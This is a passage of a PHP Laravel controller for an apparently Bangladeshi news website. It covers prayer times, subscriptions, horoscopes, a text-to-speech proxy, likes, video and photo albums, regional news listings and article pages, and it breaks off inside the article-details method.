<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use App\Models\Advertisement;
use App\Models\Category;
use App\Models\GeneralSettings;
use App\Models\ImageAlbum;
use App\Models\ImageGallery;
use App\Models\ImageCategory;
use App\Models\Subscriber;
use App\Models\Language;
use App\Models\Monthlyview;
use App\Models\Page;
use App\Models\PollQuestion;
use App\Models\Post;
use App\Models\Rss;
use App\Models\SocialLink;
use App\Models\Gallery;
use App\Models\View;
use App\Models\Widget;
use App\Models\Division;
use App\Models\District;
use App\Models\Thana;
use App\Models\Unions;
use App\Models\VideoCategory;
use App\Models\NewsLike;
use App\Models\Rashifall;

use App\Models\WidgetSetiings;
use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Facades\Artisan;

use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Http;

class FrontendController extends Controller
{

	public function __construct()
	{
		$this->auth_guests();
	}

	public function language($id = null)
	{
		Session::put('language', $id);
		return redirect()->route('frontend.index');
	}
	public function fetchSalat(Request $request)
	{
		$lat = $request->query('lat');
		$lon = $request->query('lon');

		if (!$lat || !$lon) {
			return response()->json([
				'status' => 'error',
				'message' => 'Latitude and Longitude are required',
			], 400);
		}

		$timestamp = time();
		$apiUrl = $url = "http://api.aladhan.com/v1/timings/" . date('d-m-Y');

		try {
			$response = Http::get($apiUrl, [
				'latitude' => $lat,
				'longitude' => $lon,
				'method' => 2,
			]);

			if (!$response->successful()) {
				return response()->json([
					'status' => 'error',
					'message' => 'Failed to fetch prayer times',
				], 500);
			}

			$data = $response->json();

			if (!isset($data['data']['timings'])) {
				return response()->json([
					'status' => 'error',
					'message' => 'Invalid API response',
				], 500);
			}

			return response()->json([
				'status' => 'success',
				'timings' => $data['data']['timings'],
				'meta' => $data['data']['meta'],
			]);
		} catch (\Exception $e) {
			return response()->json([
				'status' => 'error',
				'message' => $e->getMessage(),
			], 500);
		}
	}
	public function subcribe(Request $request)
	{
		if (session()->has('language') && session()->get('language') == 2) {
			$request->validate([
				'email' => 'required|email|unique:subscribers,email'
			]);

			Subscriber::create(['email' => $request->email]);

			return response()->json(['success' => 'Thanks for subscribing!']);
		} else {
			$request->validate([
				'email' => 'required|email|unique:subscribers,email',
			], [
				'email.required' => 'ইমেইল ফিল্ডটি অবশ্যই দিতে হবে।',
				'email.email' => 'সঠিক ইমেইল ঠিকানা প্রদান করুন।',
				'email.unique' => 'এই ইমেইলটি ইতিমধ্যে সাবস্ক্রাইব করা হয়েছে।',
			]);

			Subscriber::create(['email' => $request->email]);

			return response()->json(['success' => 'ধন্যবাদ! আপনি সফলভাবে সাবস্ক্রাইব করেছেন।']);
		}
	}

	public function rashifall($date = null, $id = null, $type = null, $slug = null)
	{


		if ($type == 53) {
			$date = explode("-", $date);
			$date = $date[0];
		} else if ($type == 54) {
			$date = explode("-", $date);
			$date = $date[0] . '-' . $date[1];
		} else if ($type == 55) {
			$date = $date;
		} else {
			$date = explode("-", $date);
			$date = $date[0];
		}
		$cacheKey = 'rashifall_' . $date . '_' . $id . '_' . $type;
		$data = Cache::remember($cacheKey, now()->addMinutes(30), function () use ($date, $type) {
			if ($type > 52) {
				return Rashifall::where('date', $date)->first();
			}

			return Rashifall::where('date', $date)->where('type', $type)->first();
		});

		return view('frontend.rashifall', compact('date', 'id', 'slug', 'data', 'type'));
	}


	public function rcron()
	{
		$posts = User::select('posts.id', 'posts.user_id', 'posts.view_count', 'posts.view_count', 'posts.current_count', 'posts.unique_count')
			->join('posts', 'users.id', '=', 'posts.user_id')->get();
		$monthlyViews = [];
		foreach ($posts as $post) {
			$monthlyViews[] = [
				'post_id'       => $post->id,
				'user_id'       => $post->user_id,
				'total_view'    => $post->view_count,
				'current_view' => $post->current_count,
				'unique_view'  => $post->unique_count,
				'mdate'    => date('Y-m-d H:i:s')

			];
		}
		if (!empty($monthlyViews)) {
			Monthlyview::insert($monthlyViews);
			$postIds = array_column($monthlyViews, 'post_id');
			Post::whereIn('id', $postIds)->update(['current_count' => 0]);
		}
	}



	public function ttsstream(Request $request)
	{
		$text = $request->query('text', '');
		$lang = $request->query('lang', 'bn'); // default Bangla
		$useCache = $request->query('cache', '1') === '1';

		if (! $text) {
			return response()->json(['error' => 'text parameter required'], 400);
		}

		if (mb_strlen($text) > 5000) {
			return response()->json(['error' => 'text too long'], 400);
		}

		$hash = hash('sha256', $lang . '|' . $text);
		$filename = "tts/{$hash}.mp3";

		if ($useCache && Storage::disk('local')->exists($filename)) {
			$path = Storage::disk('local')->path($filename);
			return response()->file($path, [
				'Content-Type' => 'audio/mpeg',
				'Cache-Control' => 'public, max-age=604800' // 1 week
			]);
		}

		$encoded = rawurlencode($text);
		$clientUrl = "https://translate.google.com/translate_tts?ie=UTF-8&q={$encoded}&tl={$lang}&client=tw-ob";


		try {
			$res = Http::withHeaders([
				'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
			])
				->timeout(20)
				->get($clientUrl);

			if (! $res->successful() || empty($res->body())) {
				return response()->json(['error' => 'Failed to fetch audio upstream'], 502);
			}

			$audioBody = $res->body();

			if ($useCache) {
				Storage::disk('local')->put($filename, $audioBody);
			}

			return response($audioBody, 200, [
				'Content-Type' => 'audio/mpeg',
				'Content-Length' => strlen($audioBody),
				'Cache-Control' => 'public, max-age=604800'
			]);
		} catch (\Throwable $e) {
			return response()->json(['error' => 'TTS proxy error', 'message' => $e->getMessage()], 500);
		}
	}

	public function like(Request $request)
	{
		$newsId = $request->id;
		$userId = auth()->id() ?? 0;

		$like = NewsLike::where('news_id', $newsId)->where('user_id', $userId)->first();

		if ($like) {
			$like->delete();
			$liked = false;
		} else {
			// like
			NewsLike::create([
				'news_id' => $newsId,
				'user_id' => $userId
			]);
			$liked = true;
		}
		$count = NewsLike::where('news_id', $newsId)->count();

		return response()->json(['liked' => $liked, 'count' => $count]);
	}

	public function videodetails(Request $request, $category = null)
	{

		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}
		$data =  Post::where('slug', $category)->first();
		$user_info = [];

		if ($data->user_id) {
			$user_info = User::select('name', 'photo')->where('id', $data->user_id)->first();
		}
		$ip_address = $request->ip();
		$is_view = View::where('post_id', $data->id)->where('ip_address', $ip_address)->first();
		if (empty($is_view)) {
			$view = new View();
			$view->post_id = $data->id;
			$view->ip_address = $ip_address;
			$view->view_count = 1;
			$view->created_at = date('Y-m-d');
			$view->save();
		} else {
			View::where('post_id', $data->id)->where('ip_address', $ip_address)->increment('view_count');
		}


		$result = View::where('post_id', $data->id)
			->selectRaw('COUNT(*) as totalUnique, SUM(view_count) as totalViews')
			->first();
		$totalUnique = $result->totalUnique;
		$totalViews = $result->totalViews;

		Post::where('id', $data->id)->update(['view_count' => $totalViews, 'unique_count' => $totalUnique, 'current_count' => $totalUnique]);

		$division_news =  Post::orderBy('id', 'desc')
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->whereIn('post_type', ['video'])
			->where('is_pending', 0)
			->where('status', true)
			->where('language_id', '=', $default_language->id)
			->where('id', '<>', $data->id)
			->where('category_id', $data->category_id)
			->take(8)->get();


		return view('frontend.videodetails', compact('data', 'user_info', 'totalViews', 'division_news'));
	}
	

    public function ourteam($id = null, $category = null)
    {
        $today = Carbon::today();
        $poll = \App\Models\PollQuestion::where('status', 1)
            ->where('language_id', 1)
            ->with('answers')
            ->latest()
            ->first();
    
        if (session()->has('language')) {
            $default_language = Language::find(session()->get('language'));
        } else {
            $default_language = Language::where('is_default', 1)->first();
        }
    
        if ($default_language->id == 1) {
            $title = "title_bn";
            $name = "roles.name_bn";
        } else {
            $title = "title_en";
            $name = "roles.name";
        }
    
        $reportcategories = DB::table('reportcategories')->pluck("$title AS title", 'id');
    
        if ($category) {
    
            if ($category == '2') {
    
                $data = Admin::join('roles', 'admins.role_id', '=', 'roles.id')
                    ->where('admins.id', $id)
                    ->where('admins.status', 1)
                    ->select('admins.name', 'admins.photo', 'admins.details', "$name AS role_name")
                    ->first();
    
            } else {

                $data = User::select('users.name', 'users.photo', 'users.details', 'users.report_type', 'users.next_payment_date', 'users.division_id', 'users.district_id', 'users.thana_id', 'users.union_id')
                    ->where('id', $id)
                    ->where('is_approve', 1)
                    ->first();
    
                if (!$data) {
                    abort(404);
                }
            }
    
            return view('frontend.teamdetails', compact('data', 'category', 'reportcategories','poll'));
    
        } else {

            $admins = DB::table('admins')
                ->select(
                    DB::raw("role_id as name"),
                    'photo',
                    'id',
                    'details',
                    DB::raw("NULL as next_payment_date"), 
                    DB::raw("'admin' as type"),
                    DB::raw("serial as serial"),
                    DB::raw("NULL as division_id"),
                    DB::raw("NULL as district_id"),
                    DB::raw("NULL as thana_id"),
                    DB::raw("NULL as union_id")
                )
                ->where('status', 1)
                ->where('id', '>', 1);
    
           
            $users = DB::table('users')
                ->select(
                    DB::raw("report_type as name"),
                    'photo',
                    'id',
                    'details',
                    'next_payment_date',
                    DB::raw("'user' as type"),
                    DB::raw("id as serial"),
                    'division_id',
                    'district_id',
                    'thana_id',
                    'union_id'
                )
                ->where('is_approve', 1);
    
            $newsItems = DB::query()
                ->fromSub($admins->union($users), 'temp_table')
                ->orderBy('serial', 'ASC')
                ->paginate(12);
    
            $roles = DB::table('roles')->pluck("$name As name", 'id');
            
        
            return view('frontend.ourteam', compact('newsItems', 'roles', 'reportcategories','poll'));
        }
    }



	public function video($category = null)
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}


		$image_categories = VideoCategory::orderBy('id', 'desc')->where('language_id', '=', $default_language->id)->get();
		$image_category_id = 0;
		$list_url = "<ul class='padding15'>";
		foreach ($image_categories as $list) {
			if ($category == $list->slug) {
				$image_category_id = $list->id;
			}
			$url = route('frontend.video', [$list->slug]);
			$list_url .= '<li><a href="' . $url . '">' . $list->title . '</a></li>';
		}
		$list_url .= "</ul>";
		$q =  Post::orderBy('id', 'desc')
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->whereIn('post_type', ['video'])
			->where('is_pending', 0)
			->where('language_id', '=', $default_language->id)
			->where('status', true);
		if ($category) {
			$q->where('category_id', $image_category_id);
		}

		$datas = $q->paginate(8);


		return view('frontend.video_albums', compact('datas', 'image_categories', 'list_url'));
	}

	public function photoalbumdetails($name = null)
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}
		$image_album = ImageAlbum::where('slug', '=', $name)->where('language_id', '=', $default_language->id)->first();

		$user_info = [];
		if ($image_album->user_id) {
			$user_info = Admin::select('name', 'photo')->where('id', $image_album->user_id)->first();
		}


		$image_albums = ImageGallery::join('users', 'users.id', '=', 'image_galleries.staff_id')
			->where('image_galleries.image_album_id', $image_album->id)
			->where('image_galleries.language_id', $default_language->id)
			->orderBy('image_galleries.id', 'desc')
			->select('image_galleries.*', 'users.name as user_name', 'users.email') // select specific user fields
			->get();

		return view('frontend.image_album_details', compact('image_albums', 'image_album', 'user_info'));
	}
	public function photoalbum($category = null)
	{


		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}



		$image_categories = ImageCategory::orderBy('id', 'desc')->where('language_id', '=', $default_language->id)->get();
		$image_category_id = 0;
		$list_url = "<ul class='padding15'>";
		foreach ($image_categories as $list) {
			if ($category == $list->slug) {
				$image_category_id = $list->id;
			}
			$url = route('frontend.photoalbum', [$list->slug]);
			$list_url .= '<li><a href="' . $url . '">' . $list->name . '</a></li>';
		}
		$list_url .= "</ul>";

		if ($category) {
			$datas = ImageAlbum::orderBy('id', 'desc')->where('image_category_id', '=', $image_category_id)->where('language_id', '=', $default_language->id)->paginate(10);
		} else {
			$datas = ImageAlbum::orderBy('id', 'desc')->where('language_id', '=', $default_language->id)->paginate(10);
		}



		return view('frontend.image_albums', compact('datas', 'image_categories', 'list_url'));
	}

	public function fetchDivisionNews(Request $request)
	{

		$division_id = $request->get('division_id');
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}

		$q =  Post::orderBy('id', 'desc')
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->whereIn('post_type', ['article', 'audio'])
			->where('is_pending', 0)
			->where('language_id', '=', $default_language->id)
			->where('status', true);
		if ($division_id == 1) {
			$q->where('division_id', '>', 0);
		} else {
			$division_ids = $division_id - 1;
			$q->where('division_id', $division_ids);
		}

		$news = $q->take(9)->get();

		$html = view('partial.front2.division-news', [
			'newsItems' => $news
		])->render();

		return response()->json([
			'html' => $html,
			'division_id' => $division_id,
		]);
	}

	public function fetchNews(Request $request)
	{
		$categoryId = $request->get('category_id');
		$section = $request->get('section');
		$title = $request->get('title');
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}


		$cat_section_list = $newsl = $news = [];
		if ($section == 3 || $section == 4) {

			if ($default_language->id == 1) {
				$home_setion = GeneralSettings::select('home_category_section')->first(1);
			} else {
				$home_setion = GeneralSettings::select('home_category_section_en AS home_category_section')->first(1);
			}


			if (isset($home_setion->home_category_section) && $home_setion->home_category_section) {
				$get_cat_explode = json_decode($home_setion->home_category_section, true);
				if (isset($get_cat_explode[3]) && $section == 3) {
					$cat_section_list = $get_cat_explode[3];
					$kl = 0;
					foreach ($cat_section_list as $get_cat) {
						if ($kl == 0) {
							$limit = 10;
						} else {
							$limit = 3;
						}
						$kl++;
						$newsl[$get_cat] = Post::orderBy('id', 'desc')
							->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
							->whereIn('post_type', ['article', 'audio'])
							->where('is_pending', 0)
							->where('language_id', '=', $default_language->id)
							->where('status', true)
							->where(function ($query) use ($get_cat) {
								$query->where('category_id', $get_cat)
									->orWhere('subcategories_id', $get_cat);
							})
							->take($limit)
							->get();
					}
				} else  if (isset($get_cat_explode[4]) && $section == 4) {
					$cat_section_list = $get_cat_explode[4];
					foreach ($cat_section_list as $get_cat) {
						$newsl[$get_cat] = Post::orderBy('id', 'desc')
							->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
							->whereIn('post_type', ['article', 'audio'])
							->where('is_pending', 0)
							->where('language_id', '=', $default_language->id)
							->where('status', true)
							->where(function ($query) use ($get_cat) {
								$query->where('category_id', $get_cat)
									->orWhere('subcategories_id', $get_cat);
							})
							->take(6)
							->get();
					}
				}
			}
		} else {
			$news =  Post::orderBy('id', 'desc')
				->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
				->whereIn('post_type', ['article', 'audio'])
				->where('is_pending', 0)
				->where('language_id', '=', $default_language->id)
				->where('status', true)
				->where(function ($query) use ($categoryId) {
					$query->where('category_id', $categoryId)
						->orWhere('subcategories_id', $categoryId);
				})
				->take(6)
				->get();
		}

		$html = view('partial.front2.category-news', [
			'newsItems' => $news,
			'newsItemsL' => $newsl,
			'section' => $section,
			'title' => $title,
			'cat' => $categoryId,
			'cat_section_list' => $cat_section_list
		])->render();

		return response()->json([
			'html' => $html
		]);
	}
    public function allbangladesh($divisionSlug = null, $districtSlug = null, $upazilaSlug = null)
    {
        if (session()->has('language')) {
            $default_language = Language::find(session()->get('language'));
        } else {
            $default_language = Language::where('is_default', 1)->first();
        }
    
        $lid = $default_language->id;
    
        // ✅ FIX: decode URL (IMPORTANT for Bangla + spaces)
        $divisionSlug = urldecode($divisionSlug);
        $districtSlug = urldecode($districtSlug);
        $upazilaSlug  = urldecode($upazilaSlug);
    
        if (!$divisionSlug) {
            return view('errors.404');
        }
    
        // ✅ Division find (safe)
        $division = \App\Models\Division::where(function ($q) use ($divisionSlug) {
            $q->where('name', $divisionSlug)
              ->orWhere('bn_name', $divisionSlug);
        })->first();
    
        if (!$division) {
            return view('errors.404');
        }
    
        $title = $divisionSlug;
    
        $q = Post::where('posts.division_id', $division->id)
            ->where('schedule_post_date', '<=', now())
            ->whereIn('post_type', ['article', 'audio'])
            ->where('is_pending', 0)
            ->where('posts.status', true)
            ->orderBy('posts.id', 'desc');
    
        $lists = [];
    
        // ===================== DISTRICT =====================
        if ($districtSlug) {
    
            $district = \App\Models\District::where(function ($q) use ($districtSlug) {
                $q->where('name', $districtSlug)
                  ->orWhere('bn_name', $districtSlug);
            })->first();
    
            if (!$district) {
                return view('errors.404');
            }
    
            $q->where('posts.district_id', $district->id);
    
            $title = $districtSlug;
    
            // ===================== UPAZILA =====================
            if ($upazilaSlug) {
    
                $thana = \App\Models\Thana::where(function ($q) use ($upazilaSlug) {
                    $q->where('name', $upazilaSlug)
                      ->orWhere('bn_name', $upazilaSlug);
                })->first();
    
                if (!$thana) {
                    return view('errors.404');
                }
    
                $q->where('posts.thana_id', $thana->id);
    
            } else {
                $lists = is_thana($lid, $district->id);
            }
    
            $division_real = route('frontend.bangladesh', [$division->name]);
    
            $title = '<a href="' . $division_real . '">' . $division->name . '</a> / ' . $districtSlug;
        }
    
        // ===================== LIST =====================
        if (!$districtSlug) {
            $lists = is_district($lid, $division->id);
        }
    
        // ===================== BUILD LIST URL =====================
        $list_url = "<ul class='padding15'>";
    
        foreach ($lists as $list) {
    
            if ($upazilaSlug) {
                $url = route('frontend.bangladesh', [$division->name, $district->name, $list->name]);
            } elseif ($districtSlug) {
                $url = route('frontend.bangladesh', [$division->name, $district->name, $list->name]);
            } else {
                $url = route('frontend.bangladesh', [$division->name, $list->name]);
            }
    
            $list_url .= '<li><a href="' . $url . '">' . $list->name . '</a></li>';
        }
    
        $list_url .= "</ul>";
    
        $posts = $q->paginate(10);
    
        return view('frontend.category1', compact('title', 'posts', 'list_url'));
    }
	
    public function index($val = null)
    {
        \App\Models\TopReporter::checkAndGenerateWeeklyBest();
        
        $lid = 1;
        $cacheKey = 'home_index_data_lang_' . $lid;

        $cachedData = cache()->remember($cacheKey, 180, function () use ($lid) {
            $now = now();
            $home_section = GeneralSettings::select('home_category_section')->first();
        
            $sections1 = [];
            $sections6 = [];
            $cat_section_list1 = $cat_section_list2 = $cat_section_list5 = $cat_section_list6 = [];
            $get_cat_explode = [];

            if (!empty($home_section->home_category_section)) {
                $get_cat_explode = json_decode($home_section->home_category_section, true);

                // Optimization: pre-fetch all active category and subcategory IDs to avoid N+1 exists queries in loops
                $active_cat_ids = Post::where('schedule_post_date', '<=', $now)
                    ->whereIn('post_type', ['article', 'audio'])
                    ->where('is_pending', 0)
                    ->where('status', true)
                    ->where('language_id', $lid)
                    ->groupBy('category_id')
                    ->pluck('category_id')
                    ->toArray();

                $active_subcat_ids = Post::where('schedule_post_date', '<=', $now)
                    ->whereIn('post_type', ['article', 'audio'])
                    ->where('is_pending', 0)
                    ->where('status', true)
                    ->where('language_id', $lid)
                    ->whereNotNull('subcategories_id')
                    ->groupBy('subcategories_id')
                    ->pluck('subcategories_id')
                    ->toArray();

                $active_category_ids = array_unique(array_merge($active_cat_ids, $active_subcat_ids));

                $hasPosts = function ($cat) use ($active_category_ids) {
                    return in_array($cat, $active_category_ids);
                };
        
                if (!empty($get_cat_explode[1])) {
                    foreach ($get_cat_explode[1] as $title => $cat) {
                        $posts = Post::where('schedule_post_date', '<=', $now)
                            ->whereIn('post_type', ['article', 'audio'])
                            ->where('is_pending', 0)
                            ->where('status', true)
                            ->where('language_id', $lid)
                            ->where(function ($q) use ($cat) {
                                $q->where('category_id', $cat)
                                  ->orWhere('subcategories_id', $cat);
                            })
                            ->latest()
                            ->take(6)
                            ->get();
    
                        if ($posts->isNotEmpty()) {
                            $cat_section_list1[$title] = $cat;
                            $sections1[$cat] = $posts;
                        }
                    }
                }
        
                if (!empty($get_cat_explode[2])) {
                    foreach ($get_cat_explode[2] as $title => $cat) {
                        if ($hasPosts($cat)) {
                            $cat_section_list2[$title] = $cat;
                        }
                    }
                }
        
                if (!empty($get_cat_explode[5])) {
                    foreach ($get_cat_explode[5] as $title => $cat) {
                        if ($hasPosts($cat)) {
                            $cat_section_list5[$title] = $cat;
                        }
                    }
                }

                if (!empty($get_cat_explode[6])) {
                    foreach ($get_cat_explode[6] as $title => $cat) {
                        $posts = Post::where('schedule_post_date', '<=', $now)
                            ->whereIn('post_type', ['article', 'audio'])
                            ->where('is_pending', 0)
                            ->where('status', true)
                            ->where('language_id', $lid)
                            ->where(function ($q) use ($cat) {
                                $q->where('category_id', $cat)
                                  ->orWhere('subcategories_id', $cat);
                            })
                            ->latest()
                            ->take(10)
                            ->get();
    
                        if ($posts->isNotEmpty()) {
                            $cat_section_list6[$title] = $cat;
                            $sections6[$cat] = $posts;
                        }
                    }
                }
            }
        
            $home_video_slider = Post::select('embed_video')
                ->where('is_slider', 3)
                ->where('status', true)
                ->where('is_pending', 0)
                ->where('language_id', 1)
                ->latest()
                ->first();

            return [
                'cat_section_list2' => $cat_section_list2,
                'cat_section_list5' => $cat_section_list5,
                'sections1' => $sections1,
                'sections6' => $sections6,
                'cat_section_list6' => $cat_section_list6,
                'cat_section_list1' => $cat_section_list1,
                'home_video_slider' => $home_video_slider,
            ];
        });
    
        $is_breaking = $is_trendings = $is_recents = '';
    
        return view('frontend.theme1', array_merge($cachedData, compact(
            'is_recents',
            'is_trendings',
            'is_breaking'
        )));
    }

	public function loadMore(Request $request)
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}
		$last_news = $request->last_news;
		$datas = Post::where('id', '<', $last_news)
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->whereIn('post_type', ['article', 'audio'])
			->where('is_pending', 0)
			->where('status', true)

			->where('language_id', '=', $default_language->id)
			->latest('id')
			->take(2)
			->get();

		$ajaxData['id'] = '';
		$ajaxData['output'] = '';

		foreach ($datas as $data) {

			if ($data->image_big) {
				$img = '<img src="' . asset('assets/images/post/' . $data->image_big) . '" alt="">';
			} else {
				$img = '<img src="' . $data->rss_image . '" alt="">';
			}
			$str = strlen($data->title) > 30 ? mb_substr($data->title, 0, 30, 'utf-8') . '...' : $data->title;
			$content = strlen(convertUtf8(strip_tags($data->description))) > 200 ? convertUtf8(substr(strip_tags($data->description), 0, 200)) . '...' : convertUtf8(strip_tags($data->description));
			$url = route('frontend.postBySubcategory.details', [$data->category->slug, $data->slug]);
			$date = route('frontend.postByDate') . '?date=' . $data->created_at->format('Y-m-d');

			$ajaxData['id'] = $data->id;
			$ajaxData['output'] .= '<div class="single-news land-scap-medium">
                            <div class="img">
                                <div class="tag" style="background:' . $data->category->color . '">
                                    ' . $data->category->title . '
                                </div>' . $img . '
                            </div>
                            <div class="content">
                                <a href="' . $url . '">
                                    <h4 class="title">' . $str . '</h4>
                                     <p class="text">' . $content . '</p>
                                </a>
                                <ul class="post-meta">
                                    <li>
                                        <a href="' . $date . '">' . $data->createdAt() . '</a>
                                    </li>
                                    <li>
                                        <span>|</span>
                                    </li>
                                    <li>
                                        <a href="#">
                                            ' . $data->admin->name . '
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>';
		}
		return $ajaxData;
	}

	public function category($slug)
	{


		$data = Category::where('slug', $slug)->first();
		if ($data) {

			if (session()->has('language')) {
				$default_language = Language::find(session()->get('language'));
			} else {

				$default_language = Language::where('is_default', 1)->first();
			}
			$posts = $data->posts()
				->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
				->whereIn('post_type', ['article', 'audio'])
				->where('is_pending', 0)
				->where('status', true)
				->where('status', true)
				->orderBy('id', 'desc')
				->paginate(10);

			$title = $data->title;


			return view('frontend.category1', compact('title', 'posts'));
		}
		return view('errors.404');
	}

    public function details(Request $request, $category, $slug, $print = null)
    {
        $now = now();
    
        $default_language = cache()->rememberForever('default_language', function () {
            return Language::where('is_default', 1)->first();
        });
        $lid = $default_language->id;

        if ($category === 'feature') {
            $posts = Post::where('is_feature', 1)
                ->where('schedule_post_date', '<=', $now)
                ->whereIn('post_type', ['article', 'audio'])
                ->where('is_pending', 0)
                ->where('status', true)
                ->orderByDesc('id')
                ->paginate(5);
    
            return view('frontend.category1', ['title' => $slug, 'posts' => $posts]);
        }

        // $query = Post::with(['category', 'admin.role', 'user'])->where('slug', $slug);
        
        $query = Post::with([
            'quiz',
            'category:id,title,slug',
            'admin.role:id,name',
            'user:id,name,photo,report_type,division_id,district_id,thana_id,union_id',
            'approvedBy.role:id,name'
        ])
        ->where('slug', $slug)
        ->latest();
                
        if (!auth('admin')->check()) {
            $query->where(function($q) {
                $q->where('is_pending', 0);
                if (auth()->check()) {
                    $q->orWhere('user_id', auth()->id());
                }
            });
        }
        
        $data = $query->first();

        if (!$data) {
            $categoryModel = \App\Models\Category::where('slug', $slug)->first();
        
            if ($categoryModel) {
                $posts = $categoryModel->subcategoryPosts()
                    ->where('schedule_post_date', '<=', now())
                    ->whereIn('post_type', ['article', 'audio'])
                    ->where('is_pending', 0)
                    ->where('status', 1)
                    ->latest('schedule_post_date') // newest first
                    ->paginate(10);
        
                return view('frontend.postBySubcategory1', [
                    'parent' => $categoryModel,
                    'subcategory' => $categoryModel->title,
                    'datas' => $posts
                ]);
            }
        
            return view('errors.404');
        }

        // View and balance incrementing is now handled via AJAX incrementView() method after 30 seconds stay

        $division_news = cache()->remember("details_related_news_{$data->id}", 3600, function() use ($data) {
            return Post::select('id', 'category_id', 'slug', 'title', 'image_big')
                ->with(['category:id,slug,title'])
                ->where('category_id', $data->category_id)
                ->where('is_pending', 0)
                ->where('status', 'true')
                ->where('id', '!=', $data->id)
                ->latest()
                ->take(12)
                ->get();
        });
        
        
        
        $area = '';
        
        $userData = $data->user ?? null;
        
        if ($userData && !empty($userData->report_type)) {
        
            $types = json_decode($userData->report_type, true);
        
            if (is_array($types) && isset($types[0])) {
        
                $typeId = (int)$types[0];
                $column = $lid == 1 ? 'bn_name' : 'name';
        
                if (in_array($typeId, [29, 31, 37]) && !empty($userData->division_id)) {
                    $area = DB::table('divisions')
                        ->where('id', $userData->division_id)
                        ->value($column);
                }
        
                elseif (in_array($typeId, [30, 36]) && !empty($userData->district_id)) {
                    $area = DB::table('districts')
                        ->where('id', $userData->district_id)
                        ->value($column);
                }
        
                elseif (in_array($typeId, [32, 35]) && !empty($userData->thana_id)) {
                    $area = DB::table('upazilas')
                        ->where('id', $userData->thana_id)
                        ->value($column);
                }
        
                elseif ($typeId == 34 && !empty($userData->union_id)) {
                    $area = DB::table('unions')
                        ->where('id', $userData->union_id)
                        ->value($column);
                }
            }
        }  
   
        $recents = cache()->remember("details_recents_{$lid}", 600, function() use ($lid) {
            return collect(is_recents($lid));
        });

        $trendings = cache()->remember("details_trendings_{$lid}", 600, function() use ($lid) {
            $trendingsIds = is_trendings($lid);
            return Post::whereIn('id', $trendingsIds)
                ->with('category')
                ->get();
        });
        


        $reportcategories = cache()->remember("reportcategories_$lid", 604800, function () use ($lid) {
            $column = $lid == 1 ? 'title_bn' : 'title_en';
            return DB::table('reportcategories')->pluck($column, 'id')->toArray();
        });
        
        $reporter_title = '';

        if (!empty($data->user?->report_type)) {
        
            $decoded = json_decode($data->user->report_type, true);
        
            if (is_array($decoded)) {
                $titles = [];
        
                foreach ($decoded as $id) {
                    if (isset($reportcategories[$id])) {
                        $titles[] = $reportcategories[$id];
                    }
                }
        
                $reporter_title = implode(', ', $titles);
            }
        }
        // dd($reporter_title);

        $nameColumn = $lid == 1 ? 'roles.name_bn' : 'roles.name';
        $user_info = cache()->remember("post_userinfo_{$data->id}", 86400, function () use ($data, $nameColumn) {
            return $data->admin_id ? 
                \App\Models\Admin::join('roles', 'admins.role_id', '=', 'roles.id')
                    ->where('admins.id', $data->admin_id)
                    ->select('admins.name', 'admins.photo', "$nameColumn AS role_name")
                    ->first()
                : $data->user;
        });

        $poll = cache()->remember("details_poll_{$lid}", 600, function() use ($lid) {
            return \App\Models\PollQuestion::where('status', 1)
                ->where('language_id', $lid)
                ->with('answers')
                ->latest()
                ->first();
        });

        if ($print) {
            return view('print.print1', compact('data', 'user_info', 'division_news', 'lid', 'reportcategories'));
        }
    
        $viewMap = [
            'Trivia Quiz' => 'frontend.quiz1',
            'Sorted List' => 'frontend.sort1',
            'Personality Quiz' => 'frontend.personality1',
        ];
    
        $viewName = $viewMap[$data->post_type] ?? 'frontend.details1';
        
        $side_bar_ads = cache()->remember("details_ads_19", 1800, function() {
            return \App\Models\Advertisement::where('add_placement', 19)
                ->where('status', 1)
                ->get();
        });
        
        $encouraging_ads = cache()->remember("details_ads_17", 1800, function() {
            return \App\Models\Advertisement::where('add_placement', 17)
                ->where('status', 1)
                ->get();
        });
            
        $timezone = 'Asia/Dhaka';

        $quizAnswered = false;
        $isTodayPost = false;
        $quizWinners = collect();
    
        if ($data->quiz) {
            $postDateValue = $data->schedule_post_date ?: $data->created_at;
    
            if ($postDateValue) {
                $postDate = \Carbon\Carbon::parse($postDateValue, $timezone)->toDateString();
                $todayDate = now($timezone)->toDateString();
    
                $isTodayPost = $postDate === $todayDate;
            }
    
            $quizWinners = cache()->remember("quiz_winners_{$data->quiz->id}", 300, function() use ($data) {
                return \App\Models\PostQuizWinner::where('post_quiz_id', $data->quiz->id)
                    ->with('answer')
                    ->where(function ($query) {
                        $query->whereNull('draw_type')
                            ->orWhere('draw_type', '!=', 'weekly');
                    })
                    ->orderBy('position')
                    ->get();
            });
    
            if (auth('web')->check()) {
                $quizAnswered = \App\Models\PostQuizAnswer::where('post_quiz_id', $data->quiz->id)
                    ->where('user_id', auth('web')->id())
                    ->exists();
            }
        }
    
